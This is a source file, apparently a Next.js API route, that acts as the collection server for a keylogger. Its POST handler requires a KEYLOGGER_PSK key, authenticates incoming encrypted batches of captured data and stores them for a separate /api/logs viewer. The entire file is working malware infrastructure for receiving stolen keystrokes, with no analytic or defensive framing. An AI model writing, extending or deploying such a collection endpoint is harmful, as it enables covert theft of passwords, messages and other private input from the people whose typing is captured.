import { NextResponse } from "next/server";
import { saveBatch } from "@/lib/store";
import { decryptEnvelope, isValidEnvelope, type Envelope } from "@/lib/crypto";

export const runtime = "nodejs";

function bad(msg: string, status: number): NextResponse {
  return NextResponse.json({ ok: false, error: msg }, { status });
}

export async function POST(req: Request): Promise<NextResponse> {
  if (!process.env.KEYLOGGER_PSK) return bad("not configured", 500);

  let body: Envelope;
  try {
    body = await req.json();
  } catch {
    return bad("bad json", 400);
  }

  if (!isValidEnvelope(body))
    return bad("bad fields", 400);

  // Verify the batch (GCM auth) before accepting it — a failed decrypt throws.
  // The plaintext is discarded here: batches are stored encrypted at rest
  // and only decrypted on demand by the /api/logs viewer.
  try {
    decryptEnvelope(body);
  } catch {
    return bad("auth", 401);
  }

  try {
    await saveBatch(body.d!, body.ts!, JSON.stringify(body));
  } catch {
    return bad("store", 500);
  }

  return NextResponse.json({ ok: true });
}
